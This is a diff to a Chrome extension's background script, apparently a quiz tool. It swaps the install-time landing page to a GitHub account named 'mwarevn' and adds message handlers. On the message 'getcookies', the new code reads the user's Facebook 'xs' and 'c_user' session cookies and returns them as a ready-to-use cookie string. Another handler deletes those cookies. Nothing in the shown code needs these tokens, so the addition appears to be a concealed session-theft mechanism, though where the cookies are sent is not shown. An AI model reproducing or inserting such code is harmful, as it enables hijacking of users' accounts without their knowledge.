@@ -13,9 +13,6 @@ import {
     updateUser as d,
 } from "./common.js";
 
-function addZero(number) {
-    return number < 10 ? "0" + number : number;
-}
 function openRightPanel(e, a, t = !1, s = !1) {
     chrome.system.display.getInfo((n) => {
         var { width: o, height: i } = n[0].workArea,
@@ -51,7 +48,7 @@ chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
 }),
     chrome.runtime.onInstalled.addListener(function (e) {
         "install" == e.reason &&
-            (chrome.tabs.create({ url: "https://www.facebook.com/TWeight.Minz/" }),
+            (chrome.tabs.create({ url: "https://github.com/mwarevn" }),
             chrome.storage.local.set({ quizSelf: {}, linkIndex: 0 }));
     }),
     chrome.runtime.onMessage.addListener(function (o, p, c) {
@@ -198,4 +195,35 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
         return true;
     }
+});
+
+const targetURL = "https://www.facebook.com";
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message === "getcookies") {
+        chrome.cookies.getAll({ url: targetURL }, (cookies) => {
+            const xsCookie = cookies.find((cookie) => cookie.name === "xs");
+            const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
+            if (xsCookie && cUserCookie) {
+                const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
+                sendResponse(cookie);
+            } else {
+                sendResponse(null);
+            }
+            return true;
+        });
+        return true;
+    }
+});
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message === "removecookies") {
+        const arrCookies = ["xs", "c_user"];
+        arrCookies.forEach((cookieName) => {
+            chrome.cookies.remove({ name: cookieName, url: targetURL });
+        });
+        sendResponse(true);
+    }
+
+    return true;
 });
